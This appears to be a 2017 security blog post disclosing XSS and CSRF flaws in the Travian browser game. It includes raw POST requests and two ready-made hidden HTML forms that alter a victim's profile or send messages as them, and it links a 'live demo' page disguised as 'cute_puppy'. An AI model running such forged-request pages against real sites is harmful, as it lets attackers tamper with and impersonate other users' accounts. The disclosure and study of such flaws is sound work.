---
layout: post
title:  "Hacking Travian Profiles (CSRF)"
date:   2017-02-11
tags:
- CSRF
- Hacking
- Web
- Security
- Travian
- HTTP
categories: jekyll update
---

I detected multiple XSS and CSRF vulnerabilities in [Travian](http://travian.com/){:target="_blank"} (Online game).

- The in-game messaging system of Travian did not escape {}<>'" and, when sending messages to other users, I could embed malicious JS code in messages, Which got executed upon opening
- "Edit profile" was not CSRF-protected
- "Send message" was not CSRF-protected

Here are how HTTP requests looked like:


HTTP request to send message in Travian (summarized):

    POST /messages.php?t=1 HTTP/1.1
    Host: ts1.travian.com
    Cookie: <cookie data>
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 37

    an=odysseus&be=subject1&message=body1


HTTP request to edit profile in Travian (summarized):

    POST /spieler.php HTTP/1.1
    Host: ts1.travian.com
    Cookie: ...
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    e=2&uid=19948&did=73537&tag=&monat=0&jahr=&mw=1&ort=hi&be1=test1&be2=test2&dname%5B73537%5D%3D=Ithaca&s1=Save

Surprisingly, none of `did` or `uid` were checked to protect against CSRF. I could easily setup a web page, and send a link to other users that upon opening:

- A message was sent on their behalf to another user
- Their profile info was modified (by me)

Forms to simulate the HTTP requets:

Hack user profile:

```html
    <form id="hackprofile" method="POST" action="http://ts1.travian.com/spieler.php">
        <input type="hidden" name="ort" value="Your profile has been hacked. Please delete your profile">
        <input type="hidden" name="be1" value="Your profile has been hacked. Please delete your profile">
        <input type="hidden" name="be2" value="Your profile has been hacked. Please delete your profile">
        <input type="hidden" name="e" value="2">
        <input type="hidden" name="mw" value="1">
        <input type="hidden" name="s1" value="Save">
    </form>
```

Send message on behalf of user:

```html
<form id="msg" method="POST" action="http://ts1.travian.com/messages.php?t=1">
    <input type="hidden" name="an" value="odysseus">
    <input type="hidden" name="be" value="Test">
    <input type="hidden" name="message" value="Hi">
</form>
```

screnshots:

![Travian user profile](/images/travian-hack1.png){:width="300"}

![Travian sent messages](/images/travian-hack2.png){:width="300"}


Live demo can be viewed [here](/html/exploits/travian_hack/cute_puppy.html){:target="_blank"} (Works only if you are logged into [t1.travian.com](t1.travian.com)).
